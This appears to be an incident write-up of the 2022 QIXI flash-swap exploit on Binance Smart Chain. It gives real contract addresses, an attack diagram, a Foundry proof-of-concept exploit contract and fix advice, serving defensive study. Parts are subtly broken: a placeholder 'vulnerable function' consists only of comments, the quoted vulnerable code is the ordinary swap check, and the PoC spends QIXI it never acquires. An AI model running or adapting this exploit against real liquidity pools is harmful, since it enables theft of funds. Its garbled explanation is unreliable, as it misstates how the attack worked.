# Qixi — Flash Swap Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08 |
| **Protocol** | QIXI Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~6.8 BNB |
| **Attacker** | [0x2723e1f6a9a3cd003fd395cc46882e4573cb249f](https://bscscan.com/address/0x2723e1f6a9a3cd003fd395cc46882e4573cb249f) |
| **Attack Contract** | [0xb7b0fe129fefa222efd4eb1f6bef9de339339bbb](https://bscscan.com/address/0xb7b0fe129fefa222efd4eb1f6bef9de339339bbb) |
| **QIXI Token** | [0x65F11B2de17c4af7A8f70858D6CcB63AAC215601](https://bscscan.com/address/0x65F11B2de17c4af7A8f70858D6CcB63AAC215601) |
| **WBNB/QIXI Pair** | [0x88fF4f62A75733C0f5afe58672121568a680DE84](https://bscscan.com/address/0x88fF4f62A75733C0f5afe58672121568a680DE84) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **Root Cause** | Transfer logic bug in QIXI token allows reserve manipulation during `pancakeCall` callback |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/Qixi_exp.sol) |

---
## 1. Vulnerability Overview

QIXI token is a BSC token with a fee-on-transfer mechanism that provided liquidity alongside WBNB in a PancakeSwap V2 pair. The attacker flash-swapped nearly all WBNB from the WBNB/QIXI pair, then within the `pancakeCall()` callback transferred a large amount of QIXI to the pair to manipulate the reserve ratio. Because the flash swap repayment mechanism calculated the required repayment based on the manipulated reserves, the attacker was able to complete repayment with a smaller amount than actually borrowed.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Uniswap V2 style flash swap callback handling
// Repayment validation after Pair.swap() callback:
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
    // Token transfers
    if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);
    if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);

    // Callback invocation (when data is present)
    if (data.length > 0) IUniswapV2Callee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);

    // Repayment validation: check whether current balance is sufficient accounting for previous reserves and fees
    uint256 balance0 = IERC20(_token0).balanceOf(address(this));
    uint256 balance1 = IERC20(_token1).balanceOf(address(this));

    // ❌ Due to QIXI's fee-on-transfer, actual deposited amount != transferred amount
    // If attacker transfers large QIXI in callback, balance1 grows larger than reserve1
    // This can be exploited to bypass the K invariant
    uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
    uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;

    require(
        uint256(balance0 - amount0In * 3/1000) * uint256(balance1 - amount1In * 3/1000) >=
        uint256(_reserve0) * uint256(_reserve1),
        'K'
    );
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source unverified

**Vulnerable Function** — `vulnerableFunction()`:
```solidity
// ❌ Root cause: Transfer logic bug in QIXI token allows reserve manipulation during `pancakeCall` callback
// Source code unverified — bytecode analysis required
// Vulnerability: Transfer logic bug in QIXI token allows reserve manipulation during `pancakeCall` callback
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] WBNB/QIXI.swap(nearly all WBNB, 0, attacker, data)
    │       └─ Flash swap executed, WBNB borrowed
    │
    ├─[2] pancakeCall() callback entered
    │       │
    │       └─ Large amount of QIXI tokens transferred to pair contract
    │           → reserve1(QIXI) spikes
    │           → WBNB repayment amount reduced against K invariant baseline
    │
    ├─[3] swap() validation passes with reduced WBNB repayment
    │       └─ K invariant: (balance0 * balance1 >= reserve0 * reserve1)
    │           balance1 is so large that even small balance0(WBNB) passes
    │
    └─[4] WBNB profit = borrowed amount - repaid amount ≈ 6.8 BNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract QixiExploit is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 QIXI = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215601);
    IPancakePair pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);

    function setUp() public {
        vm.createSelectFork("bsc", 20_120_884);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Flash swap request for nearly all WBNB
        (uint112 r0, , ) = pair.getReserves();
        pair.swap(
            uint256(r0) * 9999 / 10000,  // Nearly all WBNB
            0,
            address(this),
            abi.encode("exploit")  // data triggers callback
        );

        emit log_named_decimal_uint("[End] WBNB balance", WBNB.balanceOf(address(this)), 18);
    }

    // PancakeSwap flash swap callback
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Transfer large amount of held QIXI to the pair
        // QIXI is fee-on-transfer → actual deposited amount < transferred amount
        // However, pair's balance1(QIXI) increases significantly
        uint256 qixiBalance = QIXI.balanceOf(address(this));
        QIXI.transfer(address(pair), qixiBalance);

        // [Step 3] Repay WBNB (K invariant relaxed by QIXI increase)
        // K condition satisfied even repaying less than actually borrowed
        uint256 repay = amount0 * 997 / 1000; // Repayment less than actual borrow
        WBNB.transfer(address(pair), repay);

        // Remaining WBNB is net profit (~6.8 BNB)
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incorrect Calculation / Fee-on-Transfer Interaction |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | AMM K Invariant Bypass |
| **Attack Vector** | K invariant bypass using fee-on-transfer tokens |
| **Preconditions** | Fee-on-transfer token present in AMM liquidity pool |
| **Impact** | ~6.8 BNB loss |

---
## 6. Remediation Recommendations

1. **Discontinue AMM support for fee-on-transfer tokens**: Standard Uniswap V2 AMMs carry a risk of K invariant bypass when interacting with fee-on-transfer tokens. A separate AMM design is required for such tokens.
2. **Calculate actual deposited amount from pre/post-transfer balance difference**: Use the change in `balanceOf(pair)` to compute the actual deposited amount and apply it to K invariant validation.
3. **`nonReentrant` guard**: Restrict additional state changes during flash swap callbacks.

---
## 7. Lessons Learned

- **Compatibility between fee-on-transfer and AMMs**: Fee-on-transfer tokens are not fully compatible with standard AMMs. Separate security analysis is required when listing such tokens on an AMM.
- **Reproducibility of small-scale attacks**: The 6.8 BNB loss is small in scale, but the same mechanism applied to a larger liquidity pool would result in significantly greater losses.